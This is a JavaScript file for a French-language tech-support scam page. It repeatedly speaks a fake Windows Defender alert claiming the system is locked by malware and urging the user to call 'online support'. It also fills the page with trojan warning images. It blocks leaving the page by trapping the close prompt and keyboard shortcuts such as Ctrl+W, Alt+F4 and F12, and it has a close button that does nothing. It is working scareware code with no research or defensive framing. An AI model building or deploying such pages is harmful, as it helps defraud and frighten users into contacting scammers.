const VOICE_MESSAGE = "Vous êtes en présence d'un logiciel malveillant. Windows Defender a verrouillé votre système. N'éteignez surtout pas votre appareil, pour garder vos données en sécurité. Veuillez contacter l'assistance en ligne pour diagnostiquer le système.";

let isVoicePlaying = false;

/**
 * Créer et jouer le message vocal avec Web Speech API
 */
function playVoiceMessage() {
    const synth = window.speechSynthesis;
    
    if (!synth) {
        console.error("Web Speech API non supportée");
        return;
    }

    // Annuler toute parole en cours
    synth.cancel();

    const utterance = new SpeechSynthesisUtterance(VOICE_MESSAGE);
    utterance.lang = 'fr-FR';
    utterance.rate = 0.9;
    utterance.pitch = 1;
    utterance.volume = 1;

    // Quand le message se termine, le rejouer
    utterance.onend = () => {
        console.log("✅ Message terminé, redémarrage...");
        isVoicePlaying = false;
        // Relancer après 500ms
        setTimeout(() => {
            if (!document.hidden) {
                playVoiceMessage();
            }
        }, 500);
    };

    utterance.onerror = (event) => {
        console.error("❌ Erreur vocale:", event.error);
        isVoicePlaying = false;
    };

    isVoicePlaying = true;
    synth.speak(utterance);
    console.log("🔊 Message vocal en cours...");
}

/**
 * Ajouter les images trojan
 */
function loadTrojanImages() {
    const trojanTop1 = "https://thumbs.dreamstime.com/z/trojan-d-avertissement-de-signe-bouclier-virus-informatique-infection-alerte-protection-internet-s%C3%A9curit%C3%A9-118147313.jpg";
    const trojanTop2 = "https://thumbs.dreamstime.com/b/mailware-trojan-d-avertissement-de-signe-virus-informatique-infection-alerte-internet-s%C3%A9curit%C3%A9-125844326.jpg";
    const trojanBottom = "https://previews.123rf.com/images/wamsler/wamsler1310/wamsler131000028/23108677-computer-virus-sign-retro-style-vector-illustration.jpg";

    // Top scroll 1
    const scrollTop = document.querySelector('.trojan-scroll');
    for (let i = 0; i < 3; i++) {
        const img = document.createElement('img');
        img.src = trojanTop1;
        img.alt = "Trojan warning";
        scrollTop.appendChild(img);
    }

    // Top scroll 2
    const scrollTop2 = document.querySelector('.trojan-scroll-top');
    for (let i = 0; i < 3; i++) {
        const img = document.createElement('img');
        img.src = trojanTop2;
        img.alt = "Trojan warning";
        scrollTop2.appendChild(img);
    }

    // Bottom scroll
    const scrollBottom = document.querySelector('.trojan-scroll-bottom');
    for (let i = 0; i < 3; i++) {
        const img = document.createElement('img');
        img.src = trojanBottom;
        img.alt = "Virus warning";
        scrollBottom.appendChild(img);
    }
}

/**
 * Empêcher l'utilisateur de quitter
 */
function preventExit() {
    window.addEventListener('beforeunload', (e) => {
        e.preventDefault();
        e.returnValue = '';
    });

    document.addEventListener('keydown', (e) => {
        // Ctrl+W, Ctrl+Q, Alt+F4, F12
        if ((e.ctrlKey && (e.key === 'w' || e.key === 'q')) || 
            (e.altKey && e.key === 'F4') || 
            e.key === 'F12') {
            e.preventDefault();
        }
    });
}

/**
 * Fonction appelée au clic du bouton fermer (fictif)
 */
function closePopup() {
    console.log("Tentative de fermeture bloquée");
    // Ne rien faire - la popup reste
}

/**
 * Initialiser au chargement
 */
window.addEventListener('DOMContentLoaded', () => {
    console.log("🚀 Page chargée");
    
    loadTrojanImages();
    preventExit();
    
    // Jouer le son immédiatement
    playVoiceMessage();

    // Relancer si l'onglet revient au focus
    document.addEventListener('visibilitychange', () => {
        if (!document.hidden && !isVoicePlaying) {
            console.log("👁️ Onglet visible, relance du son");
            playVoiceMessage();
        }
    });

    // Fallback : relancer si silence détecté après 15 secondes
    setInterval(() => {
        if (!isVoicePlaying && !document.hidden) {
            console.log("⚠️ Pas de son détecté, relance...");
            playVoiceMessage();
        }
    }, 15000);
});
